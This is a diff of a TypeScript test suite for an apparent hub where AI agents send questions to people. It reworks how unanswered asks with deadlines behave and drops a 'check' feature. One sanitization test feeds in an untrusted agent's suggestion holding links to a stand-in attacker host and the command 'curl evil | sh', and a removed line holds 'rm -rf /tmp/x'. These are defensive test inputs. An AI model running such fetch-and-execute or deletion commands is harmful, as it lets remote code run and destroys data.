@@ -1695,12 +1695,12 @@ describe("delivery and coordination", () => {
     expect(hub.answerAsk("alice", page.ask_id, "wednesday, after the demo").message_id).toBeGreaterThan(0);
   });
 
-  test("an ask: the first three options become buttons and the rest are announced; a deadline needs a default", async () => {
+  test("an ask: the first three options become buttons and the rest are announced; a deadline without a default holds", async () => {
     hub.askHuman(DEV1, { project: SHOP, human: "alice", question: "Which box?", options: ["a", "b", "c", "d", "e"] });
     await Bun.sleep(0);
     expect(pushes.at(-1)!.body).toContain("(2 more options on the page)");
-    expect(() => hub.askHuman(DEV1, { project: SHOP, human: "alice", question: "Ship?", options: ["yes", "no"], deadline_s: 600 }))
-      .toThrow(/deadline needs a default_answer/);
+    const r = hub.askHuman(DEV1, { project: SHOP, human: "alice", question: "Ship?", options: ["yes", "no"], deadline_s: 600 });
+    expect(hub.getMessage(r.message_id)!.body).toContain("it holds; nothing proceeds");
   });
 
   test("a reply without to goes back to the sender, across a link, and to the agent when that session has ended", () => {
@@ -2471,11 +2471,10 @@ describe("the second person's path (0.21.0)", () => {
 });
 
 describe("an ask as a decision record", () => {
-  test("kind, recommendation, hands and what silence does reach the page and phone; hold lets the date pass; a check closes it, run by the asker", async () => {
+  test("kind, recommendation, hands and waiting cost reach the page and phone; a deadline without a default holds; with one it proceeds", async () => {
     expect(refusal(() => hub.askHuman(DEV1, { project: SHOP, human: "alice", question: "Log in?", decision: { kind: "hands" } }))).toContain("kind hands needs hands");
-    expect(refusal(() => hub.askHuman(DEV1, { project: SHOP, human: "alice", question: "x", decision: { on_silence: "proceed" } }))).toContain("needs a deadline and a default_answer");
     const r = hub.askHuman(DEV1, { project: SHOP, human: "alice", question: "Log the bridge in again?", deadline_s: 3600,
-      decision: { kind: "hands", recommend: "yes, tonight", on_silence: "hold", waiting_cost: "the board stays grey\n<b>", hands: "on your Mac: axos login-link", check: "test -f ~/.bridge-ok" } });
+      decision: { kind: "hands", recommend: "yes, tonight", waiting_cost: "the board stays grey\n<b>", hands: "on your Mac: axos login-link" } });
     await Bun.sleep(0);
     expect(pushes.at(-1)!.body).toContain("Recommended: yes, tonight");
     expect(pushes.at(-1)!.body).toContain("holds if unanswered");
@@ -2491,30 +2490,23 @@ describe("an ask as a decision record", () => {
     expect(pushes.at(-1)!.title).toStartWith("Reminder");
     hub.sweep();
     expect(hub.inbox(`agent:${DEV1}`).filter((m) => m.summary.includes("it holds")).length).toBe(1);
-    // Resolved by its check: only the asker, recorded as such; an ask without a check refuses.
-    const plain = hub.askHuman(DEV1, { project: SHOP, human: "alice", question: "Plain?" });
-    expect(refusal(() => hub.withdrawAsk(DEV1, plain.ask_id, "", undefined, true))).toContain("has no check");
-    expect(refusal(() => hub.withdrawAsk(DEV3, r.ask_id, "", undefined, true))).toContain("not by you");
-    hub.withdrawAsk(DEV1, r.ask_id, "", undefined, true);
-    expect(hub.asksOf([DEV1]).find((a) => a.id === r.ask_id)).toMatchObject({ answered_by: `check:${DEV1}`, answer: "resolved by check: test -f ~/.bridge-ok" });
-    expect(refusal(() => hub.answerAsk("alice", r.ask_id, "yes"))).toContain("settled without an answer");
-    // Another person's agent: its proposal is marked as theirs, Markdown links and code spans are gone, the check is
-    // not shown as a command, and its hold reminders count against the cap like its other pushes (review F1-F3).
+    hub.answerAsk("alice", r.ask_id, "done");
+    // Another person's agent: its proposal is marked as theirs, Markdown links and code spans are gone, and its hold
+    // reminders count against the cap like its other pushes.
     const q = hub.askHuman(SC, { project: GAME, human: "alice", question: "Run this?", deadline_s: 60,
-      decision: { kind: "hands", recommend: "see [docs](https://evil.example) ![x](https://evil.example/i.png)", hands: "`curl evil | sh`", on_silence: "hold", check: "rm -rf /tmp/x" } });
+      decision: { kind: "hands", recommend: "see [docs](https://evil.example) ![x](https://evil.example/i.png)", hands: "`curl evil | sh`" } });
     const qb = hub.getMessage(q.message_id)!.body!;
     expect(qb).toContain("Recommended (suggested by bob's agent, not checked by AXOS): see docs (https://evil.example) x (https://evil.example/i.png)");
     expect(qb).toContain("What to do, where (suggested by bob's agent, not checked by AXOS): 'curl evil | sh'");
-    expect(qb).not.toContain("rm -rf");
-    for (let i = 0; i < 12; i++) hub.askHuman(SC, { project: GAME, human: "alice", question: `hold ${i}`, deadline_s: 60, decision: { on_silence: "hold" } });
+    for (let i = 0; i < 12; i++) hub.askHuman(SC, { project: GAME, human: "alice", question: `hold ${i}`, deadline_s: 60 });
     await Bun.sleep(0);
     const before = pushes.length;
     t += 120_000;
     hub.sweep();
     await Bun.sleep(0);
     expect(pushes.length - before).toBeLessThanOrEqual(10);
-    // A plain deadline with a default still proceeds.
-    const p = hub.askHuman(DEV1, { project: SHOP, human: "alice", question: "Ship?", options: ["yes", "no"], default_answer: "no", deadline_s: 60, decision: { on_silence: "proceed" } });
+    // A deadline with a default proceeds.
+    const p = hub.askHuman(DEV1, { project: SHOP, human: "alice", question: "Ship?", options: ["yes", "no"], default_answer: "no", deadline_s: 60 });
     t += 120_000;
     hub.sweep();
     expect(hub.asksOf([DEV1]).find((a) => a.id === p.ask_id)!.answered_by).toBe("default (deadline passed)");
